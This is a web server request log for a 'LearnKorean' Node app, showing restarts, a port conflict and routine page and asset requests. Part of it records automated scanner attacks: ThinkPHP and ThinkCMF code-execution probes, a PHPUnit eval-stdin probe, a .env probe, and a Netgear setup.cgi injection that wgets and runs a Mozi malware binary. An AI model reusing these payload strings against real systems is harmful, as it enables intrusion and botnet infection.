
> api@0.0.0 start /home/ubuntu/LearnKorean-server
> node ./bin/www

listening...
[0mGET / [32m200 [0m3.963 ms - -[0m
[0mGET /users [36m304 [0m2.905 ms - -[0m
[0mGET /users [36m304 [0m1.005 ms - -[0m
[0mGET /users [36m304 [0m0.766 ms - -[0m
[0mGET / [32m200 [0m0.532 ms - -[0m
[0mGET /users [36m304 [0m0.692 ms - -[0m
[0mGET / [32m200 [0m0.520 ms - -[0m
[0mGET / [32m200 [0m0.483 ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

listening...

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

listening...
[0mGET / [36m304 [0m5.664 ms - -[0m
[0mGET / [36m304 [0m1.186 ms - -[0m
[0mGET / [36m304 [0m0.787 ms - -[0m
[0mGET / [36m304 [0m0.656 ms - -[0m
[0mGET / [36m304 [0m0.656 ms - -[0m
[0mGET / [36m304 [0m0.674 ms - -[0m
[0mGET / [36m304 [0m0.671 ms - -[0m
[0mGET /user [33m404 [0m491.849 ms - 15[0m
[0mGET /users [32m200 [0m0.928 ms - 23[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

listening...

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

Port 9000 is already in use
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! api@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the api@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/ubuntu/.npm/_logs/2020-08-23T11_16_03_115Z-debug.log

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

Port 9000 is already in use
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! api@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the api@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/ubuntu/.npm/_logs/2020-08-23T11_16_14_105Z-debug.log
[0mGET / [32m200 [0m3.448 ms - 14[0m
[0mGET / [32m200 [0m0.608 ms - 14[0m
[0mGET / [36m304 [0m0.459 ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> node ./bin/www

listening...
[0mGET / [36m304 [0m5.057 ms - -[0m
[0mGET / [36m304 [0m0.663 ms - -[0m
[0mGET / [36m304 [0m0.619 ms - -[0m
[0mGET / [36m304 [0m0.390 ms - -[0m
[0mGET / [36m304 [0m0.377 ms - -[0m
[0mGET /users [32m200 [0m0.631 ms - 23[0m
[0mGET / [32m200 [0m0.382 ms - 14[0m
[0mGET / [32m200 [0m0.380 ms - 14[0m
[0mGET /users [32m200 [0m0.385 ms - 23[0m
[0mGET /users [36m304 [0m0.391 ms - -[0m
[0mGET / [32m200 [0m0.342 ms - 14[0m
[0mGET /users [36m304 [0m0.390 ms - -[0m
[0mGET / [36m304 [0m0.394 ms - -[0m
[0mGET / [36m304 [0m0.379 ms - -[0m
[0mGET / [36m304 [0m0.356 ms - -[0m
[0mGET / [36m304 [0m0.363 ms - -[0m
[0mGET / [36m304 [0m0.370 ms - -[0m
[0mGET /users [32m200 [0m0.337 ms - 23[0m
[0mGET /registerEmail [32m200 [0m0.417 ms - 14[0m
[0mGET /config/getuser?index=0 [33m404 [0m354.256 ms - 15[0m
[0mGET / [32m200 [0m0.327 ms - 14[0m
[0mGET / [32m200 [0m1.711 ms - 14[0m
[0mGET / [32m200 [0m0.336 ms - 14[0m
[0mGET /ReportServer [33m404 [0m2.796 ms - 15[0m
[0mGET / [32m200 [0m0.335 ms - 14[0m
[0mGET /hudson [33m404 [0m1.820 ms - 15[0m
[0mGET / [32m200 [0m0.341 ms - 14[0m
[0mGET / [36m304 [0m0.341 ms - -[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.725 ms - 15[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.307 ms - 14[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.306 ms - 14[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.742 ms - 15[0m
[0mGET / [32m200 [0m0.311 ms - 14[0m
[0mGET / [32m200 [0m0.316 ms - 14[0m
[0mGET / [32m200 [0m0.332 ms - 14[0m
[0mGET / [32m200 [0m0.341 ms - 14[0m
[0mHEAD / [32m200 [0m0.316 ms - 14[0m
[0mGET / [32m200 [0m0.332 ms - 14[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.892 ms - 15[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m22.441 ms - 15[0m
[0mPOST /api/jsonws/invoke [33m404 [0m2.127 ms - 15[0m
[0mGET /config/getuser?index=0 [33m404 [0m1.622 ms - 15[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.604 ms - 15[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.509 ms - 15[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.296 ms - 14[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.294 ms - 14[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.627 ms - 15[0m
[0mGET /.env [33m404 [0m1.521 ms - 15[0m
[0mPOST / [33m404 [0m1.903 ms - 15[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.745 ms - 15[0m
[0mGET / [32m200 [0m0.296 ms - 14[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m2.296 ms - 15[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.926 ms - 15[0m
[0mGET / [36m304 [0m0.309 ms - -[0m
[0mGET / [32m200 [0m0.295 ms - 14[0m
[0mGET / [32m200 [0m0.306 ms - 14[0m
[0mGET /portal/redlion [33m404 [0m1.499 ms - 15[0m
[0mPOST /cgi-bin/mainfunction.cgi [33m404 [0m1.532 ms - 15[0m
[0mGET / [32m200 [0m0.320 ms - 14[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.616 ms - 15[0m
[0mGET / [36m304 [0m0.328 ms - -[0m
[0mGET /users [36m304 [0m0.351 ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> NODE_ENV=production node ./bin/www

production!
listening...
overriding...
[0mGET / [32m200 [0m5.684 ms - 1051[0m
overriding...
[0mGET /static/css/main.ce28df38.css [36m304 [0m1.498 ms - -[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [36m304 [0m0.517 ms - -[0m
overriding...
[0mGET / [36m304 [0m0.699 ms - -[0m
overriding...
[0mGET /static/css/main.ce28df38.css [36m304 [0m0.842 ms - -[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [36m304 [0m0.498 ms - -[0m
overriding...
[0mGET /favicon.ico [32m200 [0m0.906 ms - 15086[0m
overriding...
[0mGET / [36m304 [0m0.502 ms - -[0m
overriding...
[0mGET /static/css/main.ce28df38.css [36m304 [0m0.508 ms - -[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [36m304 [0m0.431 ms - -[0m
overriding...
[0mGET / [32m200 [0m0.699 ms - 1051[0m
overriding...
[0mGET /static/css/main.ce28df38.css [32m200 [0m0.752 ms - 19534[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [32m200 [0m0.706 ms - 244572[0m
overriding...
[0mGET / [32m200 [0m1.383 ms - 1051[0m
overriding...
[0mGET /static/css/main.ce28df38.css [32m200 [0m0.667 ms - 19534[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [32m200 [0m0.700 ms - 244572[0m
overriding...
[0mGET / [32m200 [0m0.669 ms - 1051[0m
overriding...
[0mGET /static/css/main.ce28df38.css [32m200 [0m0.741 ms - 19534[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [32m200 [0m0.913 ms - 244572[0m
overriding...
[0mGET /favicon.ico [32m200 [0m0.668 ms - 15086[0m
overriding...
[0mGET / [36m304 [0m0.487 ms - -[0m
overriding...
[0mGET /static/css/main.ce28df38.css [36m304 [0m0.523 ms - -[0m
overriding...
[0mGET /static/js/main.a4d26a21.js [36m304 [0m0.385 ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> NODE_ENV=production node ./bin/www

production!
listening...
overriding...
[0mGET /manifest.json [36m304 [0m4.378 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.764 ms - -[0m
overriding...
[0mGET /manifest.json [36m304 [0m0.692 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.709 ms - -[0m
overriding...
[0mGET /manifest.json [36m304 [0m0.497 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.477 ms - -[0m
overriding...
[0mGET /manifest.json [36m304 [0m0.479 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.502 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.489 ms - -[0m
overriding...
[0mGET /manifest.json [36m304 [0m0.504 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.493 ms - -[0m
overriding...
[0mGET /manifest.json [36m304 [0m0.460 ms - -[0m
overriding...
[0mGET /service-worker.js [36m304 [0m0.530 ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> NODE_ENV=production node ./bin/www

production!
listening...
[0mGET /sample.png [36m304 [0m4.262 ms - -[0m
[0mGET /favicon.ico [32m200 [0m2.768 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.429 ms - -[0m
[0mGET / [32m200 [0m0.982 ms - 1051[0m
[0mGET /static/css/main.671759c4.css [32m200 [0m0.707 ms - 19532[0m
[0mGET /static/js/main.ecf7dbd0.js [32m200 [0m0.645 ms - 242555[0m
[0mGET /sample.png [32m200 [0m0.715 ms - 285364[0m
[0mGET /favicon.ico [32m200 [0m0.667 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.416 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.553 ms - -[0m
[0mGET / [32m200 [0m1.156 ms - 1051[0m
[0mGET /static/css/main.9f3a4986.css [32m200 [0m1.393 ms - 19529[0m
[0mGET /static/js/main.dc88666b.js [32m200 [0m1.656 ms - 269078[0m
[0mGET /sample.png [32m200 [0m0.718 ms - 285364[0m
[0mGET /favicon.ico [32m200 [0m0.720 ms - 15086[0m
[0mGET /manifest.json [32m200 [0m0.612 ms - 309[0m
[0mGET /manifest.json [32m200 [0m0.686 ms - 309[0m
[0mGET /sample.png [32m200 [0m0.679 ms - 285364[0m
[0mGET /service-worker.js [32m200 [0m0.822 ms - 3164[0m
[0mGET /index.html?_sw-precache=a80c3ba26f15c88209485a52be0bbd08 [32m200 [0m0.667 ms - 1051[0m
[0mGET /static/css/main.9f3a4986.css [32m200 [0m1.531 ms - 19529[0m
[0mGET /static/js/main.dc88666b.js [32m200 [0m0.585 ms - 269078[0m
[0mGET /sample.png [36m304 [0m0.457 ms - -[0m
[0mGET /manifest.json [36m304 [0m0.458 ms - -[0m
[0mGET /favicon.ico [32m200 [0m0.699 ms - 15086[0m
[0mGET /service-worker.js [36m304 [0m0.455 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.499 ms - -[0m
[0mGET /manifest.json [36m304 [0m0.454 ms - -[0m
[0mGET /favicon.ico [32m200 [0m0.654 ms - 15086[0m
[0mGET /service-worker.js [36m304 [0m0.437 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.437 ms - -[0m
[0mGET /premium [32m200 [0m2.113 ms - 1051[0m
[0mGET /static/css/main.9f3a4986.css [32m200 [0m1.488 ms - 19529[0m
[0mGET /static/js/main.dc88666b.js [32m200 [0m1.535 ms - 269078[0m
[0mGET /favicon.ico [32m200 [0m0.674 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.421 ms - -[0m
[0mGET /favicon.ico [32m200 [0m0.679 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.478 ms - -[0m
[0mGET /service-worker.js [32m200 [0m0.685 ms - 3164[0m
[0mGET /static/css/main.9f3a4986.css [36m304 [0m0.431 ms - -[0m
[0mGET /index.html?_sw-precache=a80c3ba26f15c88209485a52be0bbd08 [32m200 [0m2.727 ms - 1051[0m
[0mGET /static/js/main.dc88666b.js [36m304 [0m0.371 ms - -[0m
[0mGET /premium [32m200 [0m0.933 ms - 1051[0m
[0mGET /static/css/main.9f3a4986.css [32m200 [0m1.294 ms - 19529[0m
[0mGET /static/js/main.dc88666b.js [32m200 [0m1.618 ms - 269078[0m
[0mGET /manifest.json [36m304 [0m0.571 ms - -[0m
[0mGET /favicon.ico [32m200 [0m1.808 ms - 15086[0m
[0mGET /favicon.ico [32m200 [0m0.623 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.380 ms - -[0m
[0mGET /manifest.json [36m304 [0m0.561 ms - -[0m
[0mGET /favicon.ico [32m200 [0m2.766 ms - 15086[0m
[0mGET /service-worker.js [36m304 [0m0.445 ms - -[0m
[0mGET /premium [32m200 [0m0.863 ms - 1051[0m
[0mGET /static/css/main.9f3a4986.css [32m200 [0m0.656 ms - 19529[0m
[0mGET /static/js/main.d399cb43.js [32m200 [0m0.536 ms - 269112[0m
[0mGET /manifest.json [32m200 [0m1.330 ms - 309[0m
[0mGET /favicon.ico [32m200 [0m1.543 ms - 15086[0m
[0mGET /manifest.json [36m304 [0m0.439 ms - -[0m
[0mGET /service-worker.js [32m200 [0m0.674 ms - 3164[0m
[0mGET /index.html?_sw-precache=4d5e1e076738299cd64e685c81611c97 [32m200 [0m2.531 ms - 1051[0m
[0mGET /static/js/main.d399cb43.js [36m304 [0m2.228 ms - -[0m
[0mGET /favicon.ico [32m200 [0m0.642 ms - 15086[0m
[0mGET / [32m200 [0m0.648 ms - 1051[0m
[0mPOST /registerEmail [32m200 [0m77.189 ms - 47[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> NODE_ENV=production node ./bin/www

production!
listening to port  9000
[0mGET /users [32m200 [0m3.421 ms - 23[0m
[0mGET /users [32m200 [0m0.640 ms - 23[0m
[0mGET /sample.png [32m200 [0m4.747 ms - 285364[0m
[0mGET / [32m200 [0m1.205 ms - 1251[0m
[0mGET /static/css/main.c7e10c55.css [32m200 [0m0.713 ms - 19645[0m
[0mGET /static/js/main.55c71043.js [32m200 [0m0.765 ms - 266769[0m
[0mGET /service-worker.js [32m200 [0m0.834 ms - 3164[0m
[0mGET /sample.png [32m200 [0m0.693 ms - 285364[0m
[0mGET / [32m200 [0m0.725 ms - 1251[0m
[0mGET /static/css/main.c7e10c55.css [32m200 [0m0.725 ms - 19645[0m
[0mGET /static/js/main.55c71043.js [32m200 [0m0.589 ms - 266769[0m
[0mGET /sample.png [32m200 [0m1.566 ms - 285364[0m
[0mGET /sample.png [36m304 [0m0.738 ms - -[0m
[0mGET / [32m200 [0m0.687 ms - 1251[0m
[0mGET /static/css/main.c7e10c55.css [32m200 [0m1.406 ms - 19645[0m
[0mGET /static/js/main.55c71043.js [32m200 [0m1.782 ms - 266769[0m
[0mGET /sample.png [32m200 [0m0.658 ms - 285364[0m
[0mGET /service-worker.js [36m304 [0m0.587 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.467 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.482 ms - -[0m
[0mGET /users [32m200 [0m0.396 ms - 23[0m
[0mGET /service-worker.js [36m304 [0m0.507 ms - -[0m
[0mGET /users [32m200 [0m0.361 ms - 23[0m
[0mGET /service-worker.js [36m304 [0m0.463 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.487 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.481 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.486 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.454 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.460 ms - -[0m
get!
undefined
[0mGET /service-worker.js [36m304 [0m0.458 ms - -[0m
[0mGET /unsubscribe [0m- [0m- ms - -[0m

> api@0.0.0 start /home/ubuntu/LearnKorean/server
> NODE_ENV=production node ./bin/www

listening to port  9000
[0mGET / [32m200 [0m6.040 ms - 1251[0m
[0mGET /static/css/main.c7e10c55.css [32m200 [0m1.304 ms - 19645[0m
[0mGET /static/js/main.55c71043.js [32m200 [0m0.703 ms - 266769[0m
[0mGET /sample.png [32m200 [0m0.784 ms - 285364[0m
[0mGET /service-worker.js [36m304 [0m1.170 ms - -[0m
[0mGET /users [32m200 [0m2.323 ms - 23[0m
[0mGET /service-worker.js [36m304 [0m0.589 ms - -[0m
[0mGET /service-worker.js [36m304 [0m0.471 ms - -[0m
[0mGET /users [32m200 [0m0.456 ms - 23[0m
[0mGET /service-worker.js [36m304 [0m0.455 ms - -[0m
